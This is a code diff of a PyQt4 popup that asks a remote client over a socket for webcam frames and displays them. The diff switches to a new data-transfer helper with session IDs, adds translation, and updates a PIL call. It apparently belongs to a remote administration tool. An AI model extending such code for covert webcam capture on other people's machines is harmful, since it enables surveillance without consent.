@@ -3,11 +3,16 @@ from PyQt4.QtCore import *
 
 import main_ui
 
-from libs.modechat import get
+from libs.data_transfer import data_get
+from libs.language import Translate
 
 import ast
 import zlib
 from PIL import Image, ImageQt
+
+# Multi Lang
+translate = Translate()
+_ = lambda _word: translate.word(_word)
 
 
 class mainPopup(QWidget, main_ui.Ui_Form):
@@ -17,10 +22,10 @@ class mainPopup(QWidget, main_ui.Ui_Form):
         self.setupUi(self)
 
         self.sock = args['sock']
-        self.socket = args['socket']
-        self.ipAddress = args['ipAddress']
+        self.client = args['client']
+        self.session_id = args['session_id']
 
-        self.setWindowTitle('%s - Web Camera Preview - Socket #%s' % (self.ipAddress, self.socket))
+        self.setWindowTitle(_('MWEBCAM_TITLE'))
 
         self.saveButton.setDisabled(True)
         self.clearButton.setDisabled(True)
@@ -31,10 +36,11 @@ class mainPopup(QWidget, main_ui.Ui_Form):
         self.alwaysTopButton.clicked.connect(self.always_top)
 
     def get_screenshot(self):
-        screen_dict = get(self.sock, 'getWebcam', self.socket)
+        data = data_get(self.sock, 'getWebcam', 'getWebcam', session_id=self.session_id, to=self.client)
+        webcam_dict = data['payload']
         try:
-            camera_info = ast.literal_eval(screen_dict)
-            im = Image.fromstring('RGB', (int(camera_info['width']), int(camera_info['height'])),
+            camera_info = ast.literal_eval(webcam_dict)
+            im = Image.frombytes('RGB', (int(camera_info['width']), int(camera_info['height'])),
                                       zlib.decompress(camera_info['webcambits']), 'raw', 'BGR', 0, -1)
             camera_bits = im.convert('RGBA')
             self.cameraLabel.setPixmap(QPixmap.fromImage(ImageQt.ImageQt(camera_bits)).scaled(
